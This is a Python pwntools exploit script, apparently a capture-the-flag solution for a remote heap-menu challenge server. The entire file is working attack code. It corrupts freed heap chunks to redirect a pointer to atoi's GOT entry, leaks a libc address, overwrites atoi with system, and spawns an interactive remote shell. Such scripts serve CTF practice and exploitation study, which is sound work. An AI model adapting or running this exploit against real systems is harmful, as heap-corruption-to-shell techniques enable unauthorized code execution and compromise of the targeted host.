from pwn import *

atoi_plt = 0x602088
array = 0x602120
libc = ELF('chall libc.so.6')
libc_system = libc.symbols['system']
libc_atoi = libc.symbols['atoi']

def alloc(data, index, size=0x80):
	p.recvuntil('Exit')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(index))
	p.recvuntil('size:')
	p.sendline(str(size))
	p.recvuntil('data:')
	p.sendline(data)
	return

def free(index):
	p.recvuntil('Exit')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(index))
	return

def show(index):
	p.recvuntil('Exit')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(index))
	p.recv(6)
	pause(1)
	return u64(p.recv(7)[1:].ljust(8, '\x00'))
	

def edit(index, data):
	p.recvuntil('Exit')
	p.sendline('3')
	p.recvuntil('index:')
	p.sendline(str(index))
	p.recvuntil('update:')
	p.sendline(data)
	return	

p = remote('hack.bckdr.in', 15133)
p.recvuntil('proceed :')
p.sendline('l\x00')
p.recvuntil('flag\n')
print p.recvuntil('}')

alloc('A'*0x60, 0, 0x80)
alloc('B'*0x60, 1, 0x80)
free(0)
alloc('Q'*0x7, 18, 0x7e)
alloc('W'*0x7, 4, 0x68)
alloc('E'*0x7, 6, 0x68)
alloc('R'*0x7, 7, 0x68)
free(18)
free(4)
free(6)
free(7)
edit(7, p64(array))
alloc('y'*0x8, 8, 0x68)
alloc('A'*16 + p64(atoi_plt), 9, 0x68)
p.recvuntil('Exit')
p.sendline('4')
p.recvuntil('index:')
p.sendline('0')
p.recv(6)
pause(1)
libc_base = u64(p.recv(7)[1:].ljust(8, '\x00')) - libc_atoi
system_addr = libc_base + libc_system
edit(0, p64(system_addr))
p.sendline('sh')
p.interactive()